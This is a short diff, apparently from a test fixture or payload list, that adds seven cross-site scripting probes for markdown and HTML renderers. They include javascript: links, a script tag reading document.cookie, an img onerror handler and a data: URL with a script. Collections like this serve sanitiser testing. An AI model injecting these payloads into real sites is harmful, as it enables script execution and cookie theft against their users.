@@ -1,0 +1,7 @@
+[a](javascript:alert(1))
+[a](javascript:prompt(1))
+[a](javascript:confirm(1))
+![a](javascript:alert(1))
+<script>alert(document.cookie)</script>
+<img src=x onerror=alert(1)>
+[a](data:text/html,<script>alert(1)</script>)
